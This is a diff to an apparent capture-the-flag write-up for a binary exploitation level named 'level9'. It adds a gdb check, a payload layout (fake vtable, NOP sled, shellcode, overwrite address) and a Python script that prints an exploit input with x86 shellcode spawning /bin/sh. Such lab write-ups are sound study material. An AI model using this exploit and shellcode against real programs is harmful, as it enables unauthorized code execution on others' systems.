@@ -19,3 +19,15 @@ Starting program: /home/user/level9/level9 "AAAA"
 Breakpoint 1, 0x0804867c in main ()
 (gdb) x/x $eax
 0x804a00c:	0x41414141 # "AAAA"
+```
+our vtable (start of shellcode*8) | padding (`0x30` times nop) | start of shellcode `0x804A05C`| address of our vtable `0x804A02C`
+
+```shell
+#!/usr/bin/python
+destination="\x0c\xa0\x04\x08"
+start_of_shellcode="\x5c\xa0\x04\x08"
+vtable=start_of_shellcode*8
+padding="\x90"*0x30
+shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+print vtable + padding + shellcode + destination
+```
